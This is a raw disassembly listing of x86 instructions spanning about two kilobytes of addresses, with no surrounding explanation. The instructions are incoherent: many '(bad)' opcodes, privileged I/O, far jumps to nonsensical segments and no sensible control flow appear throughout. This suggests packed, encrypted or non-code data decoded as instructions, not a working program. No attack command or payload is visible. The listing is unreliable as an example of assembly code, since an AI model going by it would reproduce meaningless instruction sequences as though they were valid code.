  4199f4:	icebp  
  4199f5:	jge    0x419a64
  4199f7:	and    eax,0xe8235f69
  4199fc:	cmp    BYTE PTR [edi],ch
  4199fe:	(bad)  
  419a00:	jmp    0x9a6c99d5
  419a05:	fs jecxz 0x4199f2
  419a08:	mov    dl,ah
  419a0a:	sbb    ch,BYTE PTR [ebx+ebx*8-0x7a]
  419a0e:	mov    al,0xee
  419a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a11:	sub    BYTE PTR [ecx],0xc0
  419a14:	inc    ebp
  419a15:	dec    esi
  419a16:	inc    ebx
  419a17:	mov    edx,0xc38bd91e
  419a1c:	sub    al,cl
  419a1e:	les    ebx,FWORD PTR [ecx-0x5a8d6966]
  419a24:	lea    ebx,[ebp-0x4]
  419a27:	add    al,0x74
  419a29:	xor    al,0xb2
  419a2b:	xchg   esp,eax
  419a2c:	call   0x5d6850fc
  419a31:	jmp    0xe77f:0x7717f2ee
  419a38:	pop    ds
  419a39:	dec    edi
  419a3a:	out    dx,eax
  419a3b:	push   ebp
  419a3c:	nop
  419a3d:	mov    DWORD PTR [eax+0x7574d71a],esi
  419a43:	cli    
  419a44:	cmp    dl,bh
  419a46:	jg     0x419a69
  419a48:	mov    edi,0x8effa5d3
  419a4d:	jno    0x419a3c
  419a4f:	inc    esp
  419a50:	sub    BYTE PTR [ecx+eiz*4+0x79],ah
  419a54:	or     eax,0x83f0d895
  419a59:	jmp    ebp
  419a5b:	ins    DWORD PTR es:[edi],dx
  419a5c:	mov    esi,DWORD PTR [edi-0x59]
  419a5f:	cmp    BYTE PTR [ebp+0x38],bl
  419a62:	cmp    al,0xc1
  419a64:	pop    ss
  419a65:	icebp  
  419a66:	push   ss
  419a67:	bound  edi,QWORD PTR [edx-0xc]
  419a6a:	dec    edx
  419a6b:	inc    ecx
  419a6c:	dec    BYTE PTR [ebx-0x32]
  419a6f:	call   DWORD PTR [eax+edx*4-0x196904d2]
  419a76:	push   ss
  419a77:	(bad)  
  419a78:	and    al,0xe7
  419a7a:	xchg   esp,eax
  419a7b:	mov    fs:0x61a8cd79,al
  419a81:	push   esp
  419a82:	sbb    eax,0x9b0cddd2
  419a87:	mov    al,ds:0x805b685e
  419a8c:	mov    ebp,DWORD PTR [edx-0x70]
  419a8f:	sub    eax,0x5d59b74a
  419a94:	dec    esi
  419a95:	and    al,0xb8
  419a97:	cmp    edx,DWORD PTR [edi]
  419a99:	jl     0x419a92
  419a9b:	mov    eax,0xaedf2513
  419aa0:	cld    
  419aa1:	mov    ds:0x479ec2df,eax
  419aa6:	sbb    eax,0xd20fbefc
  419aab:	(bad)  
  419aac:	(bad)  
  419aae:	push   ss
  419aaf:	les    esi,FWORD PTR [eax+eax*1+0x73]
  419ab3:	ins    DWORD PTR es:[edi],dx
  419ab4:	jbe    0x419af0
  419ab6:	repnz sbb ch,BYTE PTR fs:[ebp-0x27]
  419abb:	mov    cl,0x25
  419abd:	inc    esp
  419abe:	(bad)  
  419abf:	jmp    0x419ad8
  419ac1:	xchg   BYTE PTR [edi-0x1e828161],cl
  419ac7:	mov    WORD PTR es:[edi-0x51],fs
  419acb:	shl    BYTE PTR [edx],0x73
  419ace:	or     ch,cl
  419ad0:	shl    DWORD PTR [ebx+0x40],1
  419ad3:	retf   0x4bf1
  419ad6:	lds    ebp,FWORD PTR [edi-0x45662b54]
  419adc:	xor    DWORD PTR [esi+0x1d74fdcf],edx
  419ae2:	xchg   esi,eax
  419ae3:	outs   dx,BYTE PTR ds:[esi]
  419ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ae5:	jmp    0xd807:0x665e4fab
  419aec:	jo     0x419b22
  419aee:	mov    ebx,0x7cddf97
  419af3:	mov    fs,WORD PTR [eax+0x4f]
  419af6:	mov    ch,0x16
  419af8:	add    eax,esi
  419afa:	cwde   
  419afb:	add    eax,0xb2524e2e
  419b00:	sub    BYTE PTR [esi-0x47],0x37
  419b04:	leave  
  419b05:	adc    al,0xdb
  419b07:	adc    BYTE PTR ss:[ebx+ebx*2-0x4bc2a797],0x53
  419b10:	pop    ecx
  419b11:	mov    ecx,0xc1001b2f
  419b16:	pop    ebx
  419b17:	mov    BYTE PTR [ecx+0x2d905382],bh
  419b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b1e:	adc    al,0x76
  419b20:	jge    0x419b2c
  419b22:	adc    DWORD PTR ds:[ebx-0x1c],0xffffffe8
  419b27:	hlt    
  419b28:	cmp    esp,DWORD PTR [ebp+0x20]
  419b2b:	test   eax,0xcbc82d51
  419b30:	jmp    0xd37a:0xddad1d0f
  419b37:	lea    ebp,ds:0xc9fc1e51
  419b3d:	adc    eax,0x4badd18e
  419b42:	sub    BYTE PTR [edx-0x469e5386],cl
  419b48:	cmp    dh,BYTE PTR [edx]
  419b4a:	(bad)  
  419b4b:	add    eax,0xd7306dce
  419b50:	cmp    eax,esp
  419b52:	stos   DWORD PTR es:[edi],eax
  419b53:	fstp   TBYTE PTR [esi+ecx*4-0x3c]
  419b57:	jns    0x419b6f
  419b59:	ds in  eax,dx
  419b5b:	mov    ecx,0xa7f2fbcf
  419b60:	dec    esi
  419b61:	sbb    esi,DWORD PTR [eax+0x59]
  419b64:	cs in  eax,dx
  419b66:	sbb    eax,0x95cec96
  419b6b:	lea    ecx,[ebp+0x62ee0872]
  419b71:	hlt    
  419b72:	ficomp WORD PTR [edx+esi*1+0x383e5916]
  419b79:	retf   0x135c
  419b7c:	xor    BYTE PTR [ebx],bh
  419b7e:	xor    eax,0xcc5ef5fb
  419b83:	enter  0xa654,0xd8
  419b87:	sub    eax,0x6aab18ec
  419b8c:	in     al,0x20
  419b8e:	int3   
  419b8f:	mov    edi,0x2adb9bd5
  419b94:	test   eax,0x5042d76c
  419b99:	cs jle 0x419c18
  419b9c:	enter  0x7cd0,0xa5
  419ba0:	lds    ecx,FWORD PTR [eax]
  419ba2:	dec    ebp
  419ba3:	es sub al,dl
  419ba6:	aaa    
  419ba7:	mov    ds:0x2a864efd,eax
  419bac:	mov    ds:0x45e9399,al
  419bb1:	ja     0x419b52
  419bb3:	jmp    0xc09c:0xffb34008
  419bba:	xchg   DWORD PTR [esi-0x263537e5],ebp
  419bc0:	mov    ?,esp
  419bc2:	cmp    edi,esi
  419bc4:	test   ch,al
  419bc6:	dec    eax
  419bc7:	gs clc 
  419bc9:	pop    edx
  419bca:	mov    ds:0x68598c70,eax
  419bcf:	pop    esp
  419bd0:	add    DWORD PTR ds:0x5f7269e1,edi
  419bd6:	arpl   WORD PTR [edx],sp
  419bd8:	and    ah,0xa
  419bdb:	jno    0x419ba0
  419bdd:	mov    ebp,0xfe4efa65
  419be2:	mov    ch,0x99
  419be4:	sbb    eax,0xe4b58c0d
  419be9:	mov    ah,0x3e
  419beb:	mul    ch
  419bed:	ret    
  419bee:	sub    al,0x4e
  419bf0:	test   eax,0x281af0d2
  419bf5:	stos   BYTE PTR es:[edi],al
  419bf6:	hlt    
  419bf7:	in     al,0x18
  419bf9:	xor    al,0xed
  419bfb:	xchg   ebx,eax
  419bfc:	inc    edx
  419bfd:	sbb    BYTE PTR [ebp+0x20],al
  419c00:	adc    DWORD PTR [edi+0x1f],esi
  419c03:	xchg   DWORD PTR [ebx],esp
  419c05:	pushf  
  419c06:	mov    ah,0x42
  419c08:	pop    ss
  419c09:	cld    
  419c0a:	xchg   edx,ecx
  419c0c:	mov    edi,0x82d8173f
  419c11:	push   es
  419c12:	add    eax,0xc10f1ab1
  419c17:	pop    ebx
  419c18:	loope  0x419c58
  419c1a:	hlt    
  419c1b:	hlt    
  419c1c:	bnd jb 0x419bd5
  419c1f:	adc    dl,ch
  419c21:	hlt    
  419c22:	in     al,dx
  419c23:	push   ss
  419c24:	sub    ebp,0xfffffffb
  419c27:	lea    ebp,[esi+edi*2-0x370a6fd6]
  419c2e:	inc    ecx
  419c2f:	int    0x4b
  419c31:	inc    ebp
  419c32:	into   
  419c33:	sbb    al,0xae
  419c35:	nop
  419c36:	pop    ss
  419c37:	fadd   QWORD PTR [esi-0x8fefd92]
  419c3d:	adc    ebp,DWORD PTR ds:0x89b45018
  419c43:	cmp    eax,ebp
  419c45:	mov    ds:0xfd890d7,eax
  419c4a:	clc    
  419c4b:	push   cs
  419c4c:	push   eax
  419c4d:	push   ebp
  419c4e:	aas    
  419c4f:	xchg   edi,eax
  419c50:	ss call 0x41cd2045
  419c56:	mov    es,WORD PTR [eax]
  419c58:	dec    ebx
  419c59:	test   DWORD PTR [ebp+0x1793b812],ebx
  419c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c60:	jns    0x419ca2
  419c62:	call   0xebe72cde
  419c67:	loope  0x419c33
  419c69:	xor    ch,BYTE PTR [ecx-0x42ea78d]
  419c6f:	mov    ebp,0xc4a199db
  419c74:	sub    BYTE PTR [ebx-0x7ebf6046],bh
  419c7a:	mov    edi,0x6b260a44
  419c7f:	dec    edx
  419c80:	ja     0x419ca8
  419c82:	shl    BYTE PTR [edx-0x5bed13eb],1
  419c88:	scas   eax,DWORD PTR es:[edi]
  419c89:	mov    edx,0x4aa3ab55
  419c8e:	es mov ebp,ecx
  419c91:	mov    edx,DWORD PTR [ecx+0x41]
  419c94:	dec    edi
  419c95:	xor    DWORD PTR [edx-0x50],0x9966a5c0
  419c9c:	sub    bh,cl
  419c9e:	aam    0x2a
  419ca0:	mov    ecx,0x6bdf1759
  419ca5:	xchg   esp,eax
  419ca6:	xor    bl,BYTE PTR ds:0xb7d0a7a7
  419cac:	mov    esp,0xf5c338cb
  419cb1:	xchg   ebp,eax
  419cb2:	xchg   edx,eax
  419cb3:	repnz push edi
  419cb5:	outs   dx,DWORD PTR ds:[esi]
  419cb6:	pop    esi
  419cb7:	adc    al,0xfa
  419cb9:	jno    0x419ccd
  419cbb:	(bad)  
  419cbd:	fisubr DWORD PTR [edi+eiz*8-0x2e]
  419cc1:	inc    esi
  419cc2:	jne    0x419cf9
  419cc4:	pusha  
  419cc5:	mov    ds,edi
  419cc7:	shl    bh,cl
  419cc9:	push   edx
  419cca:	sbb    edx,esi
  419ccc:	and    ecx,ecx
  419cce:	inc    ecx
  419ccf:	mov    ds:0x97f2434a,eax
  419cd4:	pop    ebp
  419cd5:	test   DWORD PTR [esi],esi
  419cd7:	xchg   edi,eax
  419cd8:	shl    DWORD PTR [esi-0x37],1
  419cdb:	push   0x2b803ab9
  419ce0:	ret    0xfbbc
  419ce3:	or     BYTE PTR [eax+0x2830ad3e],ch
  419ce9:	addr16 or eax,0xd5ac91e4
  419cef:	inc    ebx
  419cf0:	test   DWORD PTR [ecx],ecx
  419cf2:	sti    
  419cf3:	cli    
  419cf4:	stc    
  419cf5:	cld    
  419cf6:	xor    ecx,DWORD PTR [ebp+0x52]
  419cf9:	and    esi,esi
  419cfb:	xchg   DWORD PTR [esi],eax
  419cfd:	jg     0x419c85
  419cff:	lods   eax,DWORD PTR ds:[esi]
  419d00:	mov    edi,0xf031d92f
  419d05:	xchg   ebp,eax
  419d06:	fidivr WORD PTR [edi-0x525e91d1]
  419d0c:	jmp    0x5e9f:0xd2c34536
  419d13:	les    esi,FWORD PTR [edx-0x80]
  419d16:	push   cs
  419d17:	rol    BYTE PTR [ebx+0x69],1
  419d1a:	jbe    0x419cfd
  419d1c:	adc    eax,0x41f74712
  419d21:	jae    0x419d13
  419d23:	xchg   DWORD PTR [ebx+esi*8+0x4575bc7a],ecx
  419d2a:	stc    
  419d2b:	adc    eax,0x40d700ea
  419d30:	inc    ebp
  419d31:	stos   BYTE PTR es:[edi],al
  419d32:	inc    eax
  419d33:	and    DWORD PTR [esi+0x495f472c],eax
  419d39:	pusha  
  419d3a:	repnz sar esp,1
  419d3d:	mov    ds:0xd1f31065,al
  419d42:	add    BYTE PTR [eax],bl
  419d44:	mov    eax,edx
  419d46:	stc    
  419d47:	adc    edi,DWORD PTR [ecx+0x3a49c831]
  419d4d:	loope  0x419da1
  419d4f:	sub    dl,bl
  419d51:	ror    DWORD PTR [eax+0x3a],cl
  419d54:	shl    DWORD PTR [ecx],cl
  419d56:	jge    0x419d66
  419d58:	cli    
  419d59:	ja     0x419d37
  419d5b:	imul   edi,ecx,0xffffffe0
  419d5e:	or     ecx,edx
  419d60:	push   esi
  419d61:	cmp    DWORD PTR [ecx+0x6a913a2f],ecx
  419d67:	das    
  419d68:	sbb    DWORD PTR [ecx+eax*1],0xda2ce10f
  419d6f:	data16 std 
  419d71:	sub    eax,0x8489b52a
  419d76:	xor    dl,cl
  419d78:	loop   0x419de6
  419d7a:	dec    esp
  419d7b:	mov    ch,0x13
  419d7d:	dec    ebx
  419d7e:	jo     0x419d6c
  419d80:	or     edx,DWORD PTR [ebx]
  419d82:	adc    al,0xc0
  419d84:	pop    ecx
  419d85:	cld    
  419d86:	xor    edx,DWORD PTR ds:0xce06d78b
  419d8c:	mov    BYTE PTR [esi],dh
  419d8e:	lea    ebp,[edi-0x7adaa1ec]
  419d94:	leave  
  419d95:	adc    esp,DWORD PTR [esi]
  419d97:	ficomp WORD PTR [ecx+0x334f9d05]
  419d9d:	leave  
  419d9e:	retf   
  419d9f:	push   esi
  419da0:	lahf   
  419da1:	push   edi
  419da2:	push   ss
  419da3:	test   edi,esp
  419da5:	xchg   edi,eax
  419da6:	add    BYTE PTR [ecx-0x5c51bab1],al
  419dac:	adc    ebx,DWORD PTR [esi-0x5702d187]
  419db2:	push   ebx
  419db3:	jge    0x419e2e
  419db5:	mov    eax,esp
  419db7:	loope  0x419e2d
  419db9:	lods   al,BYTE PTR ds:[esi]
  419dba:	mov    ds:0xb690a55a,eax
  419dbf:	sub    cl,bh
  419dc1:	xor    ah,dl
  419dc3:	leave  
  419dc4:	shr    BYTE PTR [eax-0x2e],cl
  419dc7:	ja     0x419d89
  419dc9:	cmp    eax,0x97bb90a2
  419dce:	cmp    cl,BYTE PTR [esi+0x5db7c4e9]
  419dd4:	not    DWORD PTR [edx+0x14]
  419dd7:	repz repnz sbb ebx,0x8fe9c7
  419ddf:	add    al,0x87
  419de2:	mov    edi,0x28934426
  419de7:	(bad)  [edx]
  419de9:	adc    BYTE PTR [eax+0x36a02637],ah
  419def:	mov    ebp,0x363b2fd6
  419df4:	sbb    edi,DWORD PTR [edi]
  419df6:	imul   ebp
  419df8:	jge    0x419e09
  419dfa:	xor    ebx,esi
  419dfc:	jg     0x419dc1
  419dfe:	xchg   edi,eax
  419dff:	push   edi
  419e00:	xchg   edi,eax
  419e01:	pop    ss
  419e02:	fadd   DWORD PTR [esi*4-0x6b156712]
  419e09:	mov    ds:0x98b2f8b7,al
  419e0e:	mov    eax,ds:0x7c3828fb
  419e13:	mov    ecx,0x3bd8cb37
  419e18:	(bad)  
  419e19:	cvtpi2ps xmm1,QWORD PTR [ecx+0x5c8ca268]
  419e20:	jmp    DWORD PTR [esi*1+0x2a8e74d0]
  419e27:	sub    eax,0x914658f0
  419e2c:	inc    eax
  419e2d:	mov    edx,0x7ff32031
  419e32:	in     eax,0x35
  419e34:	shl    DWORD PTR [esi-0xa],0x9e
  419e38:	sbb    esi,esp
  419e3a:	inc    ebp
  419e3b:	clc    
  419e3c:	or     al,0x80
  419e3e:	and    eax,0x763b4910
  419e43:	das    
  419e44:	out    dx,al
  419e45:	mov    ebx,0xc35a8116
  419e4a:	test   al,0xaa
  419e4c:	les    esi,FWORD PTR ss:[esi+ecx*8-0x68]
  419e51:	sub    DWORD PTR [eax+0x53c2ce6c],edx
  419e57:	xor    eax,0x3105bc0d
  419e5c:	and    BYTE PTR [esi+ebp*8-0x6e],dh
  419e60:	mov    WORD PTR ds:0x467f828b,?
  419e66:	scas   al,BYTE PTR es:[edi]
  419e67:	sub    al,0x19
  419e69:	repz mov bl,0x1
  419e6c:	int3   
  419e6d:	shl    ecx,0x5e
  419e70:	pop    ds
  419e71:	jbe    0x419ed4
  419e73:	mov    ch,0x2b
  419e75:	add    DWORD PTR fs:[edi+0x3f],esi
  419e79:	add    BYTE PTR [eax+0x10],0x3e
  419e7d:	inc    ebx
  419e7e:	aaa    
  419e7f:	sar    DWORD PTR [edi+ebx*1],1
  419e82:	dec    ebx
  419e83:	xchg   BYTE PTR [ebx+esi*2+0x78d46e39],dl
  419e8a:	and    dl,ah
  419e8c:	fst    DWORD PTR [ebp+0x23]
  419e8f:	xor    eax,0x3bf5d877
  419e94:	ja     0x419f10
  419e96:	pop    ebp
  419e97:	pop    esi
  419e98:	sbb    BYTE PTR [ecx+0x1],al
  419e9b:	retf   0x33e1
  419e9e:	adc    eax,0x3b71e6a7
  419ea4:	add    bh,BYTE PTR [ebx-0x11]
  419ea7:	daa    
  419ea8:	jmp    0x5bcf1044
  419ead:	fisubr DWORD PTR [bp+si-0x80]
  419eb1:	int    0xa0
  419eb3:	test   DWORD PTR [eax],ecx
  419eb5:	push   es
  419eb6:	sub    ebx,DWORD PTR [ebx+0x558e664]
  419ebc:	pushf  
  419ebd:	xchg   edx,eax
  419ebe:	jb     0x419e4c
  419ec0:	mov    al,0xfa
  419ec2:	lds    esi,FWORD PTR [ebx+0x54bfdd8a]
  419ec8:	outs   dx,BYTE PTR ds:[esi]
  419ec9:	shl    DWORD PTR [ebx+eiz*8+0x6d5902dd],1
  419ed0:	icebp  
  419ed1:	lea    ebx,[edi+0x7c4e9ec3]
  419ed7:	jnp    0x419f21
  419ed9:	scas   eax,DWORD PTR es:[edi]
  419eda:	fucomip st,st(5)
  419edc:	icebp  
  419edd:	(bad)  
  419ede:	packuswb mm3,QWORD PTR [ebx+edx*2+0x59f61ba8]
  419ee6:	xor    ah,BYTE PTR [edx+0x27]
  419ee9:	xor    al,0x3c
  419eeb:	or     BYTE PTR [edi+0x30b07bfc],bl
  419ef1:	xor    al,0x30
  419ef3:	jl     0x419f0e
  419ef5:	jl     0x419f27
  419ef7:	inc    ebx
  419ef8:	xor    eax,0x2f63f2b2
  419efd:	test   eax,0xc3a464a2
  419f02:	pop    ebx
  419f03:	stos   BYTE PTR es:[edi],al
  419f04:	fwait
  419f05:	icebp  
  419f06:	push   ebx
  419f07:	cmp    al,0xeb
  419f09:	mov    ebp,0xb1d0e174
  419f0e:	mov    edi,0x39ace34c
  419f13:	sbb    bl,cl
  419f15:	jle    0x419eed
  419f17:	push   0x9e05ca8
  419f1c:	xor    bl,bl
  419f1e:	dec    eax
  419f1f:	int3   
  419f20:	je     0x419ed4
  419f22:	das    
  419f23:	pop    edx
  419f24:	xchg   BYTE PTR [ebx],bl
  419f26:	dec    esp
  419f27:	inc    ecx
  419f28:	inc    esi
  419f29:	clc    
  419f2a:	jo     0x419f91
  419f2c:	push   cs
  419f2d:	hlt    
  419f2e:	add    edx,ecx
  419f30:	fnstenv [ecx+0x41f50631]
  419f36:	ror    BYTE PTR [ecx],0x89
  419f39:	or     dl,ch
  419f3b:	rcl    BYTE PTR [eax],cl
  419f3d:	or     dl,BYTE PTR [ebx+0x19]
  419f40:	mov    edx,0x93ec0178
  419f45:	push   ecx
  419f46:	js     0x419f27
  419f48:	mov    DWORD PTR [edi],ebx
  419f4a:	test   eax,0x6b25bd8a
  419f4f:	mov    ds:0xe6f5c3c3,al
  419f54:	mov    ebx,0xa0269c7c
  419f59:	dec    edi
  419f5a:	add    edi,esi
  419f5c:	lods   eax,DWORD PTR ds:[esi]
  419f5d:	cdq    
  419f5e:	mov    ecx,0x242752d9
  419f63:	and    eax,0xaa60595c
  419f68:	or     ebx,DWORD PTR [eax-0x46]
  419f6b:	cwde   
  419f6c:	xorps  xmm7,xmm2
  419f6f:	sub    eax,0xab267f64
  419f74:	mov    edi,0xc1759c1e
  419f79:	jnp    0x419fe7
  419f7b:	loopne 0x419f13
  419f7d:	sub    ah,BYTE PTR [eax+0x64cc9573]
  419f83:	aad    0xd7
  419f85:	test   al,0x8f
  419f87:	lods   eax,DWORD PTR ds:[esi]
  419f88:	adc    esi,DWORD PTR [ebp-0x13]
  419f8b:	mov    ch,0xef
  419f8d:	cmp    eax,DWORD PTR ds:0x530f9186
  419f93:	push   ebx
  419f94:	int3   
  419f95:	test   BYTE PTR [ebx+edx*1-0x17744f91],bh
  419f9c:	retf   0x2660
  419f9f:	push   0x6a95c88e
  419fa4:	cmc    
  419fa5:	ret    0xda20
  419fa8:	xor    al,0xa6
  419faa:	xor    ch,BYTE PTR [eax-0x67]
  419fad:	cmp    BYTE PTR [eax-0x34],0xe8
  419fb1:	add    esi,DWORD PTR [ecx+0x4f]
  419fb4:	push   ecx
  419fb5:	rcl    bl,0x86
  419fb8:	jno    0x419f70
  419fba:	pop    ecx
  419fbb:	add    al,0x2b
  419fbd:	add    ebx,DWORD PTR [edx]
  419fbf:	int3   
  419fc0:	sub    BYTE PTR [esi],ch
  419fc2:	cld    
  419fc3:	jmp    0x951e:0xfb2fd44d
  419fca:	shl    eax,0x93
  419fcd:	sub    dh,BYTE PTR [edx-0x2483028b]
  419fd3:	cli    
  419fd4:	(bad)
  419fd7:	sub    al,0x0
  419fd9:	(bad)  
  419fda:	test   ecx,edi
  419fdc:	mov    dl,0x9b
  419fde:	jae    0x41a053
  419fe0:	push   cs
  419fe1:	add    al,0x38
  419fe3:	les    ebx,FWORD PTR [ebx+0x70]
  419fe6:	push   0xaf9ef846
  419feb:	push   ecx
  419fec:	mov    dh,0x7e
  419fee:	leave  
  419fef:	mov    ecx,DWORD PTR [edi+0x68]
  419ff2:	cdq    
  419ff3:	and    al,0x4e
  419ff5:	inc    esp
  419ff6:	sub    al,0x1c
  419ff8:	inc    edi
  419ff9:	outs   dx,DWORD PTR ds:[esi]
  419ffa:	fisubr WORD PTR [edx]
  419ffc:	scas   eax,DWORD PTR es:[edi]
  419ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ffe:	add    edx,edx
  41a000:	sub    dh,BYTE PTR [edx+0x15]
  41a003:	cmp    al,0xd7
  41a005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a006:	mov    ds:0x412db8dd,eax
  41a00b:	scas   al,BYTE PTR es:[edi]
  41a00c:	push   cs
  41a00d:	adc    BYTE PTR [ecx+0x7b],bh
  41a010:	or     DWORD PTR [ebx+0x342550e],edi
  41a016:	ins    BYTE PTR es:[edi],dx
  41a017:	mov    ebp,0xabc626f4
  41a01c:	lods   eax,DWORD PTR ds:[esi]
  41a01d:	mov    ebp,0xd1762edd
  41a022:	cmp    eax,0xc44d89cd
  41a027:	aaa    
  41a028:	jns    0x41a068
  41a02a:	inc    edx
  41a02b:	push   esp
  41a02c:	sbb    edi,ebx
  41a02e:	sub    eax,0x8e8e2e00
  41a033:	hlt    
  41a034:	or     edx,edi
  41a036:	mov    dl,0xf4
  41a038:	xor    edi,esi
  41a03a:	call   0x31b0:0xbe405f25
  41a041:	lods   eax,DWORD PTR ds:[esi]
  41a042:	mov    esi,db0
  41a045:	pop    eax
  41a046:	xlat   BYTE PTR ds:[ebx]
  41a047:	xor    BYTE PTR [edx],ch
  41a049:	mov    ecx,0xde387661
  41a04e:	shr    bh,cl
  41a050:	adc    DWORD PTR [ecx-0x4b],edx
  41a053:	pusha  
  41a054:	fistp  DWORD PTR [ebp+0x49fb0c5]
  41a05a:	lods   eax,DWORD PTR ds:[esi]
  41a05b:	fidivr WORD PTR ds:0xf89ee09a
  41a061:	imul   esi,DWORD PTR [ebp-0x35064819],0xf47deb7
  41a06b:	adc    al,0xdc
  41a06d:	push   edi
  41a06e:	mov    cl,0xa0
  41a070:	add    al,0x37
  41a072:	xchg   ecx,eax
  41a073:	cs push 0x37
  41a076:	sti    
  41a077:	xchg   ebp,eax
  41a078:	outs   dx,BYTE PTR ds:[esi]
  41a079:	and    DWORD PTR ds:0xa4988196,eax
  41a07f:	xchg   ebp,eax
  41a080:	call   0xea639daa
  41a085:	adc    al,0xf2
  41a087:	bnd jb 0x41a0c4
  41a08a:	sub    al,0x17
  41a08c:	in     eax,0x1b
  41a08e:	retf   0xfbe0
  41a091:	clc    
  41a092:	cmp    al,0x65
  41a094:	or     esi,DWORD PTR [eax]
  41a096:	ret    0x15c
  41a099:	repz push ds
  41a09b:	add    ah,BYTE PTR [ecx-0xcb0f8a1]
  41a0a1:	(bad)  
  41a0a3:	adc    eax,0xa1ed2946
  41a0a8:	fsub   DWORD PTR [esi+ebp*1+0x33bd3a83]
  41a0af:	shr    edx,0x19
  41a0b2:	sbb    DWORD PTR [ebx+0x19],edx
  41a0b5:	dec    ebx
  41a0b6:	and    ebp,DWORD PTR [edi]
  41a0b8:	add    eax,0x4b374aeb
  41a0bd:	cdq    
  41a0be:	inc    ecx
  41a0bf:	call   0x7a6c:0xe95f26ce
  41a0c6:	sbb    ah,bl
  41a0c8:	adc    ebx,DWORD PTR [ecx-0x69]
  41a0cb:	adc    al,dh
  41a0cd:	out    0x92,eax
  41a0cf:	clc    
  41a0d0:	cmc    
  41a0d1:	sbb    eax,0x4959cd77
  41a0d6:	out    dx,eax
  41a0d7:	push   cs
  41a0d8:	push   ds
  41a0d9:	cmc    
  41a0da:	daa    
  41a0db:	sub    esp,DWORD PTR [esp+ebp*8]
  41a0de:	or     BYTE PTR [esi+0x46b29165],bh
  41a0e4:	jmp    0x41a0e7
  41a0e6:	jp     0x41a096
  41a0e8:	es das 
  41a0ea:	add    al,0xc0
  41a0ec:	retf   
  41a0ed:	cmp    al,0x51
  41a0ef:	pop    es
  41a0f0:	lahf   
  41a0f1:	sub    bl,BYTE PTR [ecx+0x7b703ca1]
  41a0f7:	jl     0x41a0e6
  41a0f9:	mov    bl,0x28
  41a0fb:	cmp    al,BYTE PTR [ebx+0x600f40b2]
  41a101:	add    BYTE PTR [edi-0x18],0xc2
  41a105:	mov    ds:0x6bf4b646,eax
  41a10a:	and    BYTE PTR [edi],bh
  41a10c:	sub    cl,cl
  41a10e:	and    ebx,DWORD PTR [edi+esi*4-0x55]
  41a112:	or     BYTE PTR [esi],dh
  41a114:	dec    ebx
  41a115:	not    ah
  41a117:	dec    esi
  41a118:	jno    0x41a137
  41a11a:	inc    edi
  41a11b:	(bad)  
  41a11c:	ret    0x8ef7
  41a11f:	sbb    eax,0xe3cf7a84
  41a124:	(bad)  
  41a125:	pop    ecx
  41a126:	add    ebx,edx
  41a128:	jge    0x41a0f0
  41a12a:	imul   esp,DWORD PTR [esi-0x5b],0x325f2e63
  41a131:	jl     0x41a0ee
  41a133:	mov    es,WORD PTR [ebp+0x3]
  41a136:	test   BYTE PTR [ecx-0x6ec83ce4],ah
  41a13c:	jp     0x41a10f
  41a13e:	cmp    ah,cl
  41a140:	jl     0x41a17f
  41a142:	outs   dx,DWORD PTR ds:[esi]
  41a143:	lds    eax,FWORD PTR [esi+0x5812e5c1]
  41a149:	adc    ah,ah
  41a14b:	(bad)  
  41a14c:	aad    0xfd
  41a14e:	push   edx
  41a14f:	pop    edx
  41a150:	push   eax
  41a151:	jle    0x41a1b6
  41a153:	xor    bh,BYTE PTR [esi-0x53b5f591]
  41a159:	mov    eax,ds:0x33c595a0
  41a15e:	(bad)  
  41a15f:	(bad)  [ecx-0x69e2e292]
  41a165:	cmp    ah,BYTE PTR [esp+ecx*4-0x1d]
  41a169:	xchg   ebp,eax
  41a16a:	aaa    
  41a16b:	pop    ss
  41a16c:	pop    eax
  41a16d:	or     ebp,DWORD PTR [ecx-0x24]
  41a170:	test   DWORD PTR [ebx+0x6c26f2ca],ebp
  41a176:	out    0xda,al
  41a178:	mov    ah,0xb0
  41a17a:	add    DWORD PTR [edi-0x608f016a],edx
  41a180:	mov    al,ds:0x273bb0a6
  41a185:	push   eax
  41a186:	push   ds
  41a187:	jmp    FWORD PTR [eax+0x2]
  41a18a:	iret   
  41a18b:	adc    eax,0x7252fd29
  41a190:	lods   eax,DWORD PTR ds:[esi]
  41a191:	dec    esi
  41a192:	outs   dx,DWORD PTR ds:[esi]
  41a193:	mov    eax,ds:0x334857bd
  41a198:	xor    edx,0x709ccce0
  41a19e:	mov    DWORD PTR [edi+0x54],edi
  41a1a1:	mov    dh,0xa4
  41a1a3:	sti    
  41a1a4:	test   al,0x3
  41a1a6:	outs   dx,DWORD PTR ds:[esi]
  41a1a7:	les    ebp,FWORD PTR [esi-0x3d4efad3]
  41a1ad:	cmp    BYTE PTR [ecx],dh
  41a1af:	dec    ecx
  41a1b0:	dec    esp
  41a1b1:	push   ds
  41a1b2:	mov    ebx,eax
  41a1b4:	dec    ecx
  41a1b5:	cmp    BYTE PTR [edi+0x7266f192],0xf2
  41a1bc:	fcom   DWORD PTR [esp+edx*4+0xb2cb600]
  41a1c3:	loope  0x41a1d9
  41a1c5:	pop    ebx
  41a1c6:	loope  0x41a19f
  41a1c8:	cli    
  41a1c9:	(bad)  
  41a1ca:	div    DWORD PTR [esi+0x21ac4d2]
  41a1d0:	test   BYTE PTR [ebx],0x2f
  41a1d3:	xor    BYTE PTR [edi],cl
  41a1d5:	or     BYTE PTR ss:[esi+0x30],ah
  41a1d9:	fsub   DWORD PTR [ecx-0x37]
  41a1dc:	mov    al,0xb3
  41a1de:	dec    esp
  41a1df:	and    dh,BYTE PTR [edi+0x6d2fb26d]
  41a1e5:	fisttp WORD PTR [ebx-0x3]
  41a1e8:	aad    0x80
  41a1ea:	lock pop edx
  41a1ec:	cli    
  41a1ed:	popf   
  41a1ee:	mov    ecx,0x575a052
  41a1f3:	inc    edi
  41a1f4:	idiv   BYTE PTR [ebp+0x4e]
  41a1f7:	jmp    0x7d6:0x7a8c6151
  41a1fe:	loopne 0x41a19d
  41a200:	sbb    BYTE PTR ss:[edx+0x33],0xb0
  41a205:	sbb    ah,BYTE PTR [edx]
  41a207:	lods   eax,DWORD PTR ds:[esi]
  41a208:	fwait
  41a209:	mov    dh,0x84
  41a20b:	pusha  
